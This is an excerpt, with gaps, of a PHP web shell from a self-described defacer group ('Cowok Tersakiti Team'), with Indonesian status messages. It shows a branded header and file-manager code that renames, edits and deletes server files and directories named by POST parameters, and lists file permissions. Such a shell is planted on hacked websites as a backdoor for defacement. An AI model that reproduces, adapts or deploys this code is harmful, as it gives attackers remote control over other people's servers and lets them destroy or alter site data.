...
<body>
     <center><br><br>
    	<img border="0" src="https://b.top4top.io/p_1618mr0fa0.jpg" width="250" height="">
      </center>
    <h3><font color="red" Gw Ganz:v Tqx </h3></font.
    <div class="greetings">
        * Cowok Tersakiti Team *
    </div><br>
         Defacer Tersakiti ~ <br><br>
    <div class="barlink">
    	<a href="https://soundcloud.com/defxploit">Music</a>
	<br>
?? | <a href="https://defxploit.blogspot.com/">Website</a> | ??
    	<br>
    </div><br>
...
echo '<font color="yellow">ganti nama suckess:v</font><br/>';
}else{
...
echo '<font color="yellow">Berhasil Edit Coy :)</font><br/>';
}else{
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="yellow">Directory Terhapus Coy :V </font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus coy :V                                                                                                                                                                                                                                                                                            </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="yellow">File Berhsil Terhapus Coy:V</font><br/>';
}else{
...
<tr class="first">
<td><center>Nama nya :)</IKM4L></center></td>
<td><center>Ukuran Nya :)</IKM4L></center></td>
<td><center>Permission Nya Coy :)</peller></center></td>
<td><center>Memodifikasi Nya :)</IKM4L></center></td>
</tr>';
...
echo '<center><br/><size="6"./Tn.code</center>
</body>
</html>';
function perms($file){
